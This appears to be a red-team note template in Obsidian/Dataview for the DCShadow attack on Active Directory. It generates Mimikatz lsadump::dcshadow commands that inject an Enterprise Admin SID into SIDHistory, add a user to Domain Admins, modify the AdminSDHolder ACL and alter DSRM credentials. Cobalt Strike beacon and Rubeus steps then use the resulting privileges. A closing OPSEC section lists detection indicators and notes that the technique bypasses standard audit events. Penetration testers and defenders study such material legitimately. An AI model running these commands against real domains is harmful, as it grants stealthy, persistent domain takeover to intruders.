---
# Attack-specific fields
dcshadow_target_user:
dcshadow_attribute:
dcshadow_value:
dcshadow_action: sidhistory
notes:
---

# DCShadow

> [!abstract] Attack Summary
> **DCShadow** temporarily registers a rogue Domain Controller in Active Directory using Mimikatz, then pushes malicious attribute changes (SID History injection, group membership, AdminSDHolder ACL modification, DSRM password) directly to the real DC via replication — bypassing standard audit events. Requires DA or SYSTEM on any domain-joined machine.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["DC FQDN",  b?.dc_fqdn  ?? "—"],
  ["Domain SID",b?.domain_sid ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const actions = ["sidhistory","groupmember","admincount","dsrm_password","spn","uac"];
const actionOptions = actions.map(a => `option(${a})`).join(',');

dv.table(["Field", "Value"], [
  ["Target User/Object",    `\`INPUT[text:dcshadow_target_user]\``],
  ["Attribute to Modify",   `\`INPUT[text:dcshadow_attribute]\``],
  ["New Value",             `\`INPUT[text:dcshadow_value]\``],
  ["Action Type",           `\`INPUT[inlineSelect(defaultValue(${p.dcshadow_action ?? 'sidhistory'}),${actionOptions}):dcshadow_action]\``],
]);
```

> [!warning] DCShadow requires **two Mimikatz sessions** running simultaneously:
> - **Session 1 (SYSTEM):** Registers the rogue DC and performs the push
> - **Session 2 (DA):** Triggers the replication

---

## Step 1 — Prerequisites

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.paragraph("```bash\n# Requirements:\n# 1. SYSTEM access on a domain-joined machine\n# 2. Domain Admin token available (for triggering replication)\n\n# Get SYSTEM\ngetsystem\ngetuid  # Verify: NT AUTHORITY\\SYSTEM\n\n# Spawn a second Beacon as DA\nmake_token DOMAIN\\DomainAdmin PASSWORD\nspawn LISTENER\n```");
```

---

## Step 2 — Prepare the Push (Session 1 — SYSTEM)

**Common Action A — SID History Injection**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain    = b?.domain ?? "domain.local";
const domainSid = b?.domain_sid ?? "S-1-5-21-REPLACE";
const targetUser= p?.dcshadow_target_user || "regularuser";
// Enterprise Admin RID = 519
const eaSid     = domainSid + "-519";
dv.paragraph("```bash\n# Session 1 (SYSTEM beacon): Stage the push\n# Inject Enterprise Admin SID into user's SIDHistory\nmimikatz lsadump::dcshadow /object:" + targetUser + " /attribute:SIDHistory /value:'" + eaSid + "'\n\n# This stages but does NOT push yet\n# You'll see: [DC] Register rogue DC — wait for push command\n```");
```

**Common Action B — Add User to Domain Admins**
```dataviewjs
const p = dv.current();
const targetUser = p?.dcshadow_target_user || "regularuser";
dv.paragraph("```bash\n# Get current DA group members DN\n# Then add target user to the DA group members attribute\nmimikatz lsadump::dcshadow /object:'CN=Domain Admins,CN=Users,DC=domain,DC=local' /attribute:member /value:'+CN=" + targetUser + ",CN=Users,DC=domain,DC=local'\n```");
```

**Common Action C — Modify AdminSDHolder ACL**
```dataviewjs
const p = dv.current();
const targetUser = p?.dcshadow_target_user || "regularuser";
dv.paragraph("```bash\n# Get current AdminSDHolder nTSecurityDescriptor\n# Add full control for target user\n# This is complex — use PowerView to generate the SDDL first\n$user = Get-ADUser '" + targetUser + "'\n$sid = $user.SID.Value\n$newACE = 'A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;' + $sid\n\n# Then push via DCShadow:\nmimikatz lsadump::dcshadow /object:'CN=AdminSDHolder,CN=System,DC=domain,DC=local' /attribute:nTSecurityDescriptor /value:NEW_SDDL\n```");
```

**Common Action D — DSRM Password**
```dataviewjs
dv.paragraph("```bash\n# Set DSRM (Directory Services Restore Mode) password on DC\n# Can be used for offline DC admin access\nmimikatz lsadump::dcshadow /object:'CN=DC_NAME,OU=Domain Controllers,DC=domain,DC=local' /attribute:pwdLastSet /value:'0'\n\n# More useful: set DSRM account password hash\nmimikatz lsadump::dcshadow /push /attribute:unicodePwd\n```");
```

Attribute: `INPUT[text:dcshadow_attribute]` | Value: `INPUT[text:dcshadow_value]`

---

## Step 3 — Register Rogue DC (Session 1 — SYSTEM)

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "DOMAIN";
dv.paragraph("```bash\n# Session 1 (SYSTEM): Start DCShadow listener\n# This registers the machine as a rogue DC and listens for replication trigger\nmimikatz lsadump::dcshadow /start\n\n# You'll see:\n# [DC] Will push changes to DC_FQDN\n# [RPC] Service  : ldap\n# Keep this running and switch to Session 2\n```");
```

---

## Step 4 — Trigger Replication (Session 2 — DA)

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "DOMAIN";
dv.paragraph("```bash\n# Session 2 (Domain Admin token): Trigger push\nmimikatz lsadump::dcshadow /push\n\n# This forces the legitimate DC to pull changes from your rogue DC\n# After: Session 1 will show 'Push complete'\n```");
```

---

## Step 5 — Verify and Use

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain    = b?.domain   ?? "DOMAIN";
const dc_ip     = b?.dc_ip    ?? "DC_IP";
const targetUser= p?.dcshadow_target_user || "regularuser";
dv.paragraph("```bash\n# Verify the change was applied\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search '(samaccountname=" + targetUser + ")' --attributes samaccountname,sidhistory,memberOf\n\n# If SIDHistory was injected: user now has implicit DA rights\n# Get TGT and verify group membership\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt /user:" + targetUser + " /password:PASSWORD /domain:" + domain + " /nowrap\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe describe /ticket:TICKET_BASE64\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - DCShadow modifies **AD replication metadata** — detectable via MS-DRSR monitoring.
> - Unusual replication partners (non-DC machines) visible in replication topology monitoring.
> - `netlogon` service starting on a non-DC is anomalous — **Event 7036**.
> - Microsoft Defender for Identity / MDI specifically detects DCShadow.
> - Changes pushed via DCShadow may **NOT** generate standard change audit events (Event 5136) — that's the point. However, replication monitoring can catch it.
> - SID History injection is specifically flagged by MDI.

---

## Notes & Results

`INPUT[textarea:notes]`
